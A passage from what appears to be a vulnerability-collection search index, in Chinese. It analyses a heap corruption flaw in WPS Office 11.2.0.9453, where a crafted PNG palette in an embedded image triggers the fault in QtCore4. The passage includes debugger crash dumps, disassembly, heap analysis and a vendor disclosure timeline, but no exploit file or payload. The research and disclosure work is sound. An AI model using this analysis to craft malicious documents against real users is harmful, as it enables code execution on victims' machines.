2020-08-31-WPS\u56e2\u961f\u901a\u77e5\u4ed6\u4eec\u4e0d\u518d\u66f4\u65b0\u6216\u7ef4\u62a4\u4efb\u4f55\u5b89\u5168\u516c\u544a\u3002 2020-09-03-\u6f0f\u6d1e\u5199\u4fe1 \u8981\u6c42CVE\u3002","title":"\u91d1\u5c71WPS Office\u8fdc\u7a0b\u5806\u635f\u574f\u6f0f\u6d1e\u5bfc\u81f4\u4ee3\u7801\u6267\u884c"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1WPS%20Office%E8%BF%9C%E7%A8%8B%E5%A0%86%E6%8D%9F%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_1","text":"WPS Office\u662f\u7531Microsoft\u73e0\u6d77\u7684\u4e2d\u56fd\u8f6f\u4ef6\u5f00\u53d1\u5546\u91d1\u5c71\u8f6f\u4ef6\u5f00\u53d1\u7684\u529e\u516c\u5957\u4ef6\uff0c\u9002\u7528\u4e8eMicrosoft Windows\uff0cmacOS\uff0cLinux\uff0ciOS\u548cAndroid\u3002WPS Office\u7531\u4e09\u4e2a\u4e3b\u8981\u7ec4\u4ef6\u7ec4\u6210\uff1aWPS Writer\uff0cWPS Presentation\u548cWPS Spreadsheet\u3002\u4e2a\u4eba\u57fa\u672c\u7248\u672c\u53ef\u4ee5\u514d\u8d39\u4f7f\u7528\u3002WPS Office\u8f6f\u4ef6\u4e2d\u5b58\u5728\u4e00\u4e2a\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e\uff0c\u662f\u5f53Office\u8f6f\u4ef6\u5728\u5206\u6790\u7279\u5236Office\u6587\u4ef6\u65f6\u4e0d\u6b63\u786e\u5730\u5904\u7406\u5185\u5b58\u4e2d\u7684\u5bf9\u8c61\u65f6\u5f15\u8d77\u7684\u3002\u6210\u529f\u5229\u7528\u6b64\u6f0f\u6d1e\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u5f53\u524d\u7528\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\u4efb\u610f\u4ee3\u7801\u3002\u6545\u969c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\u3002\u6f0f\u6d1e\u4ea7\u54c1WPS Office\uff0c\u5f71\u54cd\u7248\u672c11.2.0.9453\u3002","title":"\u603b\u89c8"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1WPS%20Office%E8%BF%9C%E7%A8%8B%E5%A0%86%E6%8D%9F%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_2","text":"\u5728WPS Office\u4e2d\u7528\u4e8e\u56fe\u50cf\u683c\u5f0f\u89e3\u6790\u7684Qt\u6a21\u5757\u4e2d\u53d1\u73b0\u5806\u635f\u574f\u3002\u5d4c\u5165WPS office\u7684\u7279\u5236\u56fe\u50cf\u6587\u4ef6\u53ef\u80fd\u4f1a\u89e6\u53d1\u6b64\u6f0f\u6d1e\u3002\u6253\u5f00\u7279\u5236\u7684\u6587\u6863\u6587\u4ef6\u65f6\uff0c\u89e6\u53d1\u8bbf\u95ee\u51b2\u7a81\u3002EDX\u6307\u5411\u6570\u7ec4\u7684\u6307\u9488\uff0c\u800cEAX\u662f\u6307\u5411\u6570\u7ec4\u7684\u7d22\u5f15\u3002 0:000> g (c50.b4): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=000000c0 ebx=006f1c48 ecx=cd2aefbc edx=cd2c6f80 esi=2ed7ae18 edi=0000001c eip=6ba13321 esp=006f1b44 ebp=006f1b44 iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00210202 QtCore4!QMatrix::dy+0x48a8: 6ba13321 8b448210 mov eax,dword ptr [edx+eax*4+10h] ds:002b:cd2c7290=???????? \u5d29\u6e83\u662f\u5982\u4f55\u89e6\u53d1\u7684\uff1f\u8ba9\u6211\u4eec\u770b\u4e00\u4e0bPNG\u6807\u5934\u683c\u5f0f\u3002 00029E30 FF 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 \u00ff\u2030PNG........IHD 00029E40 52 00 00 02 80 00 00 01 C6 04 03 00 00 00 16 0A R...\u20ac...\u00c6....... 00029E50 27 FC 00 00 00 04 67 41 4D 41 00 00 B1 88 95 98 '\u00fc....gAMA..\u00b1\u02c6\u2022\u02dc 00029E60 F4 A6 00 00 00 30 50 4C 54 45 00 00 00 80 00 00 \u00f4\u00a6...0PLTE...\u20ac.. 00029E70 00 80 00 80 80 00 00 00 80 80 00 80 00 80 80 80 .\u20ac.\u20ac\u20ac...\u20ac\u20ac.\u20ac.\u20ac\u20ac\u20ac 00029E80 80 80 C0 C0 C0 FF 00 00 00 FF 00 FF FF 00 00 00 \u20ac\u20ac\u00c0\u00c0\u00c0\u00ff...\u00ff.\u00ff\u00ff... 00029E90 FF FF 00 FF 00 FF FF FF FF FF 7B 1F B1 C4 00 00 \u00ff\u00ff.\u00ff.\u00ff\u00ff\u00ff\u00ff\u00ff{.\u00b1\u00c4.. \u4ece\u504f\u79fb\u91cf0x29E31\u5f00\u59cb-0x29E34\u662fPNG\u6587\u4ef6\u683c\u5f0f\u7684\u7b7e\u540d\u6807\u5934\u3002PNG\u5934\u6587\u4ef6\u7684\u7ed3\u6784\uff1a PNG signature --> IHDR --> gAMA --> PLTE --> pHYs --> IDAT --> IEND \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5f53WPS Office Suite\u4e2d\u4f7f\u7528\u7684QtCore\u5e93\u89e3\u6790PLTE\u7ed3\u6784\u5e76\u89e6\u53d1\u5806\u7834\u574f\u65f6\uff0c\u8be5\u6f0f\u6d1e\u4f4d\u4e8eWord\u6587\u6863\u4e2d\u7684\u5d4c\u5165\u5f0fPNG\u6587\u4ef6\u4e2d\u3002\u5728\u504f\u79fb\u91cf0x29E82\u52300x29E85\u5904\uff0c\u8c03\u8272\u677f\u7684\u89e3\u6790\u5931\u8d25\uff0c\u4ece\u800c\u89e6\u53d1\u4e86\u5806\u4e2d\u7684\u5185\u5b58\u635f\u574f\u3002\u5d29\u6e83\u89e6\u53d1\u4e4b\u524d\u7684\u5806\u6808\u8ddf\u8e2a\uff1a 00 00ee1790 6b8143ef QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a71 01 00ee17f0 6b814259 QtCore4!QBrush::setMatrix+0x234 02 00ee58d4 6b8249a4 QtCore4!QBrush::setMatrix+0x9e 03 00ee58ec 6b80cc84 QtCore4!QImage::rect+0x22b 04 00ee5908 6b857ccc QtCore4!QTransform::inverted+0xec8 05 00ee629c 6b81c55b QtCore4!QSvgFillStyle::setFillOpacity+0x1b59 06 00ee6480 6b896844 QtCore4!QPainter::drawPixmap+0x1c98 07 00ee6574 6d1e0fbd QtCore4!QPainter::drawImage+0x325 08 00ee6594 6d0dd155 kso!GdiDrawHoriLineIAlt+0x11a1a \u5728QtCore4\u89e3\u6790\u5d4c\u5165\u5f0f\u56fe\u50cf\u4e4b\u524d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6765\u81eaKSO\u6a21\u5757\u7684\u6700\u540e\u4e00\u6b21\u8c03\u7528\uff0c\u8bd5\u56fe\u5904\u7406\u56fe\u50cfkso\uff01GdiDrawHoriLineIAlt\u3002\u4f7f\u7528IDA Pro\u5206\u89e3\u5e94\u7528\u7a0b\u5e8f\u6765\u5206\u6790\u53d1\u751f\u5f02\u5e38\u7684\u529f\u80fd\u3002\u6700\u540e\u7684\u5d29\u6e83\u8def\u5f84\u5982\u4e0b\uff08WinDBG\u7ed3\u679c\uff09\uff1a QtCore4!QMatrix::dy+0x48a8: 6ba13321 8b448210 mov eax,dword ptr [edx+eax*4+10h] ds:002b:cd2c7290=???????? \u5728IDA Pro\u4e2d\u6253\u5f00\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u6309\u4ee5\u4e0b\u65b9\u5f0f\u53cd\u6c47\u7f16\u8be5\u51fd\u6570\uff1a .text:67353315 push ebp .text:67353316 mov ebp, esp .text:67353318 movzx eax, byte ptr [ecx+edx] ; crash here .text:6735331C mov ecx, [ebp+arg_0] .text:6735331F mov edx, [ecx] .text:67353321 mov eax, [edx+eax*4+10h] .text:67353325 mov ecx, eax \u4f7f\u7528\u6545\u969c\u8f6c\u50a8\u4e2d\u7684\u4fe1\u606f\uff0c\u6211\u4eec\u77e5\u9053\u5e94\u7528\u7a0b\u5e8f\u5728 0x67353321\uff08\u79fb\u52a8eax\uff0c[edx + eax * 4 + 10h]\uff09 \u5904\u89e6\u53d1\u4e86\u8bbf\u95ee\u51b2\u7a81\u3002\u6211\u4eec\u53ef\u4ee5\u770b\u5230EAX\u5bc4\u5b58\u5668\u75310xc0\u503c\u63a7\u5236\u3002\u56e0\u6b64\uff0c\u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u5bfc\u81f4\u5f02\u5e38\u7684\u6307\u4ee4\u5bf9\u5bc4\u5b58\u5668\u7684\u72b6\u6001\u8fdb\u884c\u4e00\u4e9b\u5047\u8bbe\u3002\u9700\u8981\u6ce8\u610f\u7684\u91cd\u8981\u4e00\u70b9\u662f\uff0c\u5728\u53d1\u751f\u5f02\u5e38\u4e4b\u524d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230ECX\uff080xc0\uff09\u4e2d\u5305\u542b\u7684\u503c\u6b63\u5728\u5199\u5165\u5230\u4ee5\u4e0b\u6307\u4ee4\u6240\u5b9a\u4e49\u7684\u4efb\u610f\u4f4d\u7f6e\uff1a mov ecx, [ebp+arg_0] \u6b64\u5916\uff0c\u6211\u4eec\u6ce8\u610f\u5230\uff0c\u5728\u6211\u4eec\u7684\u6545\u969c\u6307\u4ee4\u4e4b\u5916\uff0cEBP\u7684\u504f\u79fb\u91cf\u5b58\u50a8\u5728ECX\u5bc4\u5b58\u5668\u4e2d\u3002\u6211\u4eec\u5728\u524d\u9762\u63d0\u5230\u7684\u6307\u4ee4\uff08\u504f\u79fb\u91cf\u4e3a0x6ba1331c\uff09\u4e0a\u8bbe\u7f6e\u4e86\u4e00\u4e2a\u65ad\u70b9\uff0c\u4ee5\u89c2\u5bdf\u5185\u5b58\u3002\u65ad\u70b9\u89e6\u53d1\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7b2c\u4e00\u4e2a\u503cc45adfbc\u5f15\u7528\u4e86\u53e6\u4e00\u4e2a\u6307\u9488\uff0c\u8be5\u6307\u9488\u5e94\u8be5\u662f\u6307\u5411\u6570\u7ec4\u7684\u6307\u9488\u3002``` Breakpoint 0 hit eax=0000000f ebx=004f1b40 ecx=d3544100 edx=0000001c esi=d1200e18 edi=0000001c eip=6ba1331c esp=004f1a34 ebp=004f1a34 iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200202 QtCore4!QMatrix::dy+0x48a3: 6ba1331c 8b4d08 mov ecx,dword ptr [ebp+8] ss:002b:004f1a3c=c45adfbc 0:000> dc ebp+8 004f1a3c c45adfbc 00000048 00000000 6f13830f ..Z.H..........o 004f1a4c 004f5cc8 00000000 00000000 00000000 .\\O............. 004f1a5c 00000000 004f65a0 004f662c 00000000 .....eO.,fO..... 004f1a6c 779eae8e 00000000 00000001 3f800000 ...w...........? 004f1a7c 3f800000 3f31e4f8 3f800000 3f800000 ...?..1?...?...? 004f1a8c 3f800000 3f31e4f8 3f800000 3de38800 ...?..1?...?...= 004f1a9c 3de38800 3d9e1c8a 3c834080 004f3c00 ...=...=.@.<.<O. 004f1aac 4101c71c 6ba13315 3f800000 4081c71c ...A.3.k...?...@ \u4ecec45adfbc\u89c2\u5bdf\u5185\u5b58\u5f15\u7528\uff0c\u53d1\u73b0\u53e6\u4e00\u4e2a\u6307\u9488\u3002\u7b2c\u4e00\u4e2a\u503cab69cf80\u59cb\u7ec8\u8868\u793a\u4e3a\u6307\u5411\u5b83\u6240\u5f15\u7528\u7684\u4efb\u4f55\u5730\u65b9\u7684\u6307\u9488\u3002\u6307\u9488ab69cf80\u57fa\u672c\u4e0a\u662f\u6211\u4eec\u6307\u9488\u7684\u7d22\u5f15\u6570\u7ec4\u3002 0:000> dc c45adfbc c45adfbc ab69cf80 d3544100 00000003 00000280 ..i..AT......... c45adfcc 0000055a 00000012 c0c0c0c0 1c3870e2 Z............p8. c45adfdc 40ad870e 1c3870e2 40ad870e 00000000 ...@.p8....@.... c45adfec 00000000 c0c0c0c1 6c1d12c0 00000000 ...........l.... c45adffc c0c0c0c0 ???????? ???????? ???????? ....???????????? c45ae00c ???????? ???????? ???????? ???????? ???????????????? c45ae01c ???????? ???????? ???????? ???????? ???????????????? c45ae02c ???????? ???????? ???????? ???????? ???????????????? 0:000> dc ab69cf80 ab69cf80 00000001 0000001c 00000010 00000001 ................ // 0000001c is overwritten in the register EDX and EDI before we trigger crash ab69cf90 ff000000 ff800000 ff008000 ff808000 ................ ab69cfa0 ff000080 ff800080 ff008080 ff808080 ................ ab69cfb0 ffc0c0c0 ffff0000 ff00ff00 ffffff00 ................ // ffc0c0c0 where it will be stored in EAX after crash, at the moment it only takes 0xf value in EAX ab69cfc0 ff0000ff ffff00ff ff00ffff ffffffff ................ ab69cfd0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ ab69cfe0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ ab69cff0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ \u56e0\u4e3a\u6211\u4eec\u77e5\u9053\u5d29\u6e83\u7684\u8def\u5f84\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u7b80\u5355\u5730\u8bbe\u7f6e\u4e00\u4e2a\u65ad\u70b9\u3002\u8be5\u547d\u4ee4\u5c06\u83b7\u5f97\u6307\u9488\u503c\u201c edx + eax \\* 4 + 10\u201d\uff0c\u5e76\u68c0\u67e5\u5176\u662f\u5426\u6ee1\u8db30xc0\u3002 bp 6ba13321 \".if (poi(edx+eax*4+10) == 0xc0) {} .else {gc}\" 0:000> g eax=000000c0 ebx=004f1b40 ecx=c45adfbc edx=ab69cf80 esi=d1200e18 edi=0000001c eip=6ba13321 esp=004f1a34 ebp=004f1a34 iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200202 QtCore4!QMatrix::dy+0x48a8: 6ba13321 8b448210 mov eax,dword ptr [edx+eax*4+10h] ds:002b:ab69d290=???????? \u5982\u679c\u89c2\u5bdf\u5806\u6808\uff0c\u53ef\u4ee5\u770b\u5230\u4ee5\u4e0b\u6267\u884c\uff1a 004f1a38 6ba3cb98 QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a74 004f1a3c c45adfbc 004f1a40 00000048 004f1a44 00000000 004f1a48 6f13830f verifier!DphCommitMemoryForPageHeap+0x16f 004f1a4c 004f5cc8 004f1a50 00000000 004f1a54 00000000 004f1a58 00000000 004f1a5c 00000000 004f1a60 004f65a0 004f1a64 004f662c 004f1a68 00000000 004f1a6c 779eae8e ntdll!RtlAllocateHeap+0x3e \u5982\u679c\u6211\u4eec\u53cd\u6c47\u7f166ba3cb98\uff0c\u5219\u53ef\u4ee5\u770b\u5230\u4ee5\u4e0b\u53cd\u6c47\u7f16\u4ee3\u7801\u3002\u771f\u6b63\u7684\u6839\u672c\u539f\u56e0\u5728\u4e8e\u6b64\u4ee3\u7801\u3002 6ba3cb89 8b96b4000000 mov edx,dword ptr [esi+0B4h] 6ba3cb8f 8b4df4 mov ecx,dword ptr [ebp-0Ch] 6ba3cb92 52 push edx 6ba3cb93 8bd7 mov edx,edi 6ba3cb95 ff5580 call dword ptr [ebp-80h] 6ba3cb98 8b4e7c mov ecx,dword ptr [esi+7Ch] C pseudo code grad = *(&ptr_grad); if ( grad > 0.0099999998 ) { input_value = grad_size(check, size, input); ptr_grad = *(input); ... cut here ... \u6211\u4eec\u57286ba3cb89\u5730\u5740\u4e0a\u8bbe\u7f6e\u65ad\u70b9\uff0c\u5e76\u89c2\u5bdfESI + 0xB4\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u6307\u9488\u6307\u5411\u53e6\u4e00\u4e2a\u4f4d\u7f6e\uff1a 0:000> r eax=00000000 ebx=00791878 ecx=00000005 edx=00793938 esi=cb07de18 edi=0000001c eip=6ba3cb89 esp=00791780 ebp=00791870 iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200202 QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a65: 6ba3cb89 8b96b4000000 mov edx,dword ptr [esi+0B4h] ds:002b:cb07decc=cf69afbc 0:000> dc esi+0B4h cb07decc cf69afbc c0c0c000 00000000 00000100 ..i............. cb07dedc c0c0c0c0 00000000 00000000 00000000 ................ cb07deec 00000000 00000000 00000000 00000000 ................ cb07defc 00000000 cf030fd0 00000000 00000000 ................ cb07df0c 00000000 00000000 00000000 00000000 ................ cb07df1c c0c0c0c0 00000000 3ff00000 00000000 ...........?.... cb07df2c 00000000 00000000 00000000 00000000 ................ cb07df3c 00000000 00000000 3ff00000 00000000 ...........?.... 0:000> dc cf69afbc cf69afbc c88baf80 d1326100 00000003 00000280 .....a2......... cf69afcc 0000055f 00000012 c0c0c0c0 1c3870e2 _............p8. cf69afdc 40ad870e 1c3870e2 40ad870e 00000000 ...@.p8....@.... cf69afec 00000000 c0c0c0c1 6c1d12c0 00000000 ...........l.... cf69affc c0c0c0c0 ???????? ???????? ???????? ....???????????? cf69b00c ???????? ???????? ???????? ???????? ???????????????? cf69b01c ???????? ???????? ???????? ???????? ???????????????? cf69b02c ???????? ???????? ???????? ???????? ???????????????? 0:000> dc c88baf80 c88baf80 00000001 0000001c 00000010 00000001 ................ c88baf90 ff000000 ff800000 ff008000 ff808000 ................ c88bafa0 ff000080 ff800080 ff008080 ff808080 ................ c88bafb0 ffc0c0c0 ffff0000 ff00ff00 ffffff00 ................ c88bafc0 ff0000ff ffff00ff ff00ffff ffffffff ................ c88bafd0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ c88bafe0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ c88baff0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ \u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u4ee3\u7801\u5b9e\u9645\u4e0a\u6ca1\u6709\u4ece\u6307\u9488\u91ca\u653e\u4efb\u4f55\u4e1c\u897f\u3002\u4e00\u65e6\u79fb\u81f3EDX\uff0cEDX\u5c06\u4fdd\u7559\u6307\u5411\u7d22\u5f15\u6570\u7ec4\u7684\u6307\u9488\uff1a eax=00000000 ebx=00791878 ecx=00000005 edx=cf69afbc esi=cb07de18 edi=0000001c eip=6ba3cb8f esp=00791780 ebp=00791870 iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200202 QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a6b: 6ba3cb8f 8b4df4 mov ecx,dword ptr [ebp-0Ch] ss:002b:00791864=d1326100 0:000> dc cf69afbc cf69afbc c88baf80 d1326100 00000003 00000280 .....a2......... cf69afcc 0000055f 00000012 c0c0c0c0 1c3870e2 _............p8. cf69afdc 40ad870e 1c3870e2 40ad870e 00000000 ...@.p8....@.... cf69afec 00000000 c0c0c0c1 6c1d12c0 00000000 ...........l.... cf69affc c0c0c0c0 ???????? ???????? ???????? ....???????????? cf69b00c ???????? ???????? ???????? ???????? ???????????????? cf69b01c ???????? ???????? ???????? ???????? ???????????????? cf69b02c ???????? ???????? ???????? ???????? ???????????????? 0:000> dc c88baf80 c88baf80 00000001 0000001c 00000010 00000001 ................ c88baf90 ff000000 ff800000 ff008000 ff808000 ................ c88bafa0 ff000080 ff800080 ff008080 ff808080 ................ c88bafb0 ffc0c0c0 ffff0000 ff00ff00 ffffff00 ................ c88bafc0 ff0000ff ffff00ff ff00ffff ffffffff ................ c88bafd0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ c88bafe0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ c88baff0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ \u5d29\u6e83\u540e\u7684\u5806\u6808\u8ddf\u8e2a\uff1a 0:000> kvL # ChildEBP RetAddr Args to Child 00 012f18d4 6ba3cb98 cc53afbc 00000048 00000000 QtCore4!QMatrix::dy+0x48a8 01 012f19d0 6b8143ef 00000000 012f1b78 012f1a5c QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a74 02 012f1a30 6b814259 0000002e 012f5bd0 00000000 QtCore4!QBrush::setMatrix+0x234 03 012f5b14 6b8249a4 0000003b 012f5b68 cc780e18 QtCore4!QBrush::setMatrix+0x9e 04 012f5b2c 6b80cc84 0000003b 012f5b68 cc780e18 QtCore4!QImage::rect+0x22b 05 012f5b48 6b857ccc 0000003b 012f5b68 cc780e18 QtCore4!QTransform::inverted+0xec8 06 012f64dc 6b81c55b 00000000 003c0000 00000000 QtCore4!QSvgFillStyle::setFillOpacity+0x1b59 07 012f66c0 6b896844 012f6724 cc818ff0 0000001c QtCore4!QPainter::drawPixmap+0x1c98 08 012f67b4 6d1e0fbd 012f69ec 012f66d4 012f6864 QtCore4!QPainter::drawImage+0x325 09 012f67d4 6d0dd155 012f6a54 012f69ec 012f6864 kso!GdiDrawHoriLineIAlt+0x11a1a 0a 012f67ec 6d0c8d88 012f69ec 012f68e0 012f6864 kso!kpt::PainterExt::drawBitmap+0x23 \u5806\u5206\u6790\uff1a 0:000> !heap -p -a cc53afbc address cc53afbc found in _DPH_HEAP_ROOT @ 6731000 in busy allocation ( DPH_HEAP_BLOCK: UserAddr UserSize - VirtAddr VirtSize) cc36323c: cc53afa8 58 - cc53a000 2000 6f13ab70 verifier!AVrfDebugPageHeapAllocate+0x00000240 77a9909b ntdll!RtlDebugAllocateHeap+0x00000039 779ebbad ntdll!RtlpAllocateHeap+0x000000ed 779eb0cf ntdll!RtlpAllocateHeapInternal+0x0000022f 779eae8e ntdll!RtlAllocateHeap+0x0000003e 6f080269 MSVCR100!malloc+0x0000004b 6f08233b MSVCR100!operator new+0x0000001f 6b726c67 QtCore4!QImageData::create+0x000000fa 6b726b54 QtCore4!QImage::QImage+0x0000004e 6b7a0e21 QtCore4!png_get_text+0x00000436 6b79d7a8 QtCore4!QImageIOHandler::setFormat+0x000000de 6b79d457 QtCore4!QPixmapData::fromFile+0x000002bf 6b725eb4 QtCore4!QImageReader::read+0x000001e2 6d0ca585 kso!kpt::VariantImage::forceUpdateCacheImage+0x0000254e 6d0c5964 kso!kpt::Direct2DPaintEngineHelper::operator=+0x00000693 6d0c70d0 kso!kpt::RelativeRect::unclipped+0x00001146 6d0c8d0c kso!kpt::VariantImage::forceUpdateCacheImage+0x00000cd5 6d451d5c kso!BlipCacheMgr::BrushCache+0x0000049a 6d451e85 kso!BlipCacheMgr::GenerateBitmap+0x0000001d 6d453227 kso!BlipCacheMgr::GenCachedBitmap+0x00000083 6d29bb92 kso!drawing::PictureRenderLayer::render+0x000009b6 6d450fb1 kso!drawing::RenderTargetImpl::paint+0x00000090 6d29b528 kso!drawing::PictureRenderLayer::render+0x0000034c 6d2a2d83 kso!drawing::VisualRenderer::render+0x00000060 6d2b8970 kso!drawing::SingleVisualRenderer::drawNormal+0x000002b5 6d2b86a7 kso!drawing::SingleVisualRenderer::draw+0x000001e1 6d2b945e kso!drawing::SingleVisualRenderer::draw+0x00000046 6d3d0142 kso!drawing::ShapeVisual::paintEvent+0x0000044a 680a2b5c wpsmain!WpsShapeTreeVisual::getHittestSubVisuals+0x000068f1 6d0e36df kso!AbstractVisual::visualEvent+0x00000051 6d3cbe97 kso!drawing::ShapeVisual::visualEvent+0x0000018f 6d0eba90 kso!VisualPaintEvent::arriveVisual+0x0000004e 0:000> dt _DPH_BLOCK_INFORMATION cc780e18-0x20 verifier!_DPH_BLOCK_INFORMATION +0x000 StartStamp : 0xc0c0c0c0 +0x004 Heap : 0xc0c0c0c0 Void +0x008 RequestedSize : 0xc0c0c0c0 +0x00c ActualSize : 0xc0c0c0c0 +0x010 Internal : _DPH_BLOCK_INTERNAL_INFORMATION +0x018 StackTrace : 0xc0c0c0c0 Void +0x01c EndStamp : 0xc0c0c0c0 \u6bb5\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5806\u6761\u76ee\u901a\u5e38\u662f\u4e00\u4e2a\u7a7a\u95f2\u5757\u3002\u5806\u5757\u7684\u72b6\u6001\u6307\u793a\u4e3a\u7a7a\u95f2\u5757\u3002\u5806\u5757\u58f0\u660e\u524d\u4e00\u4e2a\u5757\u7684\u5927\u5c0f\u4e3a00108\uff0c\u800c\u5f53\u524d\u5757\u7684\u5927\u5c0f\u4e3a00a30\u3002\u524d\u4e00\u5757\u62a5\u544a\u5176\u81ea\u8eab\u5927\u5c0f\u4e3a0x20\u5b57\u8282\uff0c\u4e0d\u5339\u914d\u3002\u4f4d\u7f6e\u4e3a05f61000\u7684\u5806\u5757\u7684\u4f7f\u7528\u4f3c\u4e4e\u662f\u8be5\u5806\u5757\u7684\u4f7f\u7528\u5bfc\u81f4\u4ee5\u4e0b\u5757\u7684\u5143\u6570\u636e\u635f\u574f\u7684\u53ef\u80fd\u6027\u3002\u5806\u5757\uff1a 0:000> !heap -a 05f60000 Index Address Name Debugging options enabled 1: 05f60000 Segment at 05f60000 to 0605f000 (00001000 bytes committed) Flags: 00000002 ForceFlags: 00000000 Granularity: 8 bytes Segment Reserve: 00100000 Segment Commit: 00002000 DeCommit Block Thres: 00000200 DeCommit Total Thres: 00002000 Total Free Size: 00000146 Max. Allocation Size: fffdefff Lock Variable at: 05f60258 Next TagIndex: 0000 Maximum TagIndex: 0000 Tag Entries: 00000000 PsuedoTag Entries: 00000000 Virtual Alloc List: 05f6009c Uncommitted ranges: 05f6008c 05f61000: 000fe000 (1040384 bytes) FreeList[ 00 ] at 05f600c0: 05f605b8 . 05f605b8 05f605b0: 00108 . 00a30 [100] - free Segment00 at 05f60000: Flags: 00000000 Base: 05f60000 First Entry: 05f604a8 Last Entry: 0605f000 Total Pages: 000000ff Total UnCommit: 000000fe Largest UnCommit:00000000 UnCommitted Ranges: (1) Heap entries for Segment00 in Heap 05f60000 address: psize . size flags state (requested size) 05f60000: 00000 . 004a8 [101] - busy (4a7) 05f604a8: 004a8 . 00108 [101] - busy (107) Internal 05f605b0: 00108 . 00a30 [100] 05f60fe0: 00a30 . 00020 [111] - busy (1d) 05f61000: 000fe000 - uncommitted bytes. 0:000> dd 05f60fe0 05f60fe0 a9b3c836 03007087 05f6008c 05f6008c 05f60ff0 05f60038 05f60038 05f61000 000fe000 05f61000 ???????? ???????? ???????? ???????? 05f61010 ???????? ???????? ???????? ???????? 05f61020 ???????? ???????? ???????? ???????? 05f61030 ???????? ???????? ???????? ???????? 05f61040 ???????? ???????? ???????? ???????? 05f61050 ???????? ???????? ???????? ???????? ```","title":"\u6f0f\u6d1e\u5206\u6790"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1WPS%20Office%E8%BF%9C%E7%A8%8B%E5%A0%86%E6%8D%9F%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_3","text":"\u8be5\u6f0f\u6d1e\u4e8e2020\u5e748\u6708\u62a5\u544a\u3002\u62ab\u9732\u65f6\u95f4\u8868\uff1a 2020-08-04-\u5c06\u7535\u5b50\u90ae\u4ef6\u53d1\u9001\u5230\u516c\u5f00\u63d0\u4f9b\u7684WPS\u7684\u5404\u79cd\u90ae\u4ef6\u5217\u8868\uff08\u9500\u552e\u548c\u652f\u6301\uff09\u3002 2020-08-10-WPS\u56e2\u961f\u56de\u5e94\u8be5\u62a5\u544a\u53ef\u4ee5\u8f6c\u53d1\u7ed9\u4ed6\u4eec\u3002 2020-08-11-\u8981\u6c42\u8fdb\u4e00\u6b65\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u54a8\u8be2\u548c\u5411\u9002\u5f53\u7684\u6e20\u9053\u62ab\u9732\u7b49\u3002 2020-08-17-\u6839\u636e\u5148\u524d\u7684\u8981\u6c42\u4e0eWPS\u56e2\u961f\u8fdb\u884c\u8ddf\u8fdb\u3002 2020-08-18-WPS\u56e2\u961f\u505a\u51fa\u56de\u5e94\uff0c\u4ed6\u4eec\u4f1a\u7167\u987e\u597d\u5b83\uff0c\u5e76\u8f6c\u4ea4\u7ed9\u5f00\u53d1\u56e2\u961f\u3002 2020-08-18-\u901a\u8fc7\u7535\u5b50\u90ae\u4ef6\u63d0\u4f9b\u6280\u672f\u62a5\u544a\u548c\u6982\u5ff5\u9a8c\u8bc1\uff08\u672a\u52a0\u5bc6\uff09\u3002 2020-08-25-WPS\u8ddf\u8fdb\u62a5\u544a\u8fdb\u5ea6\u3002 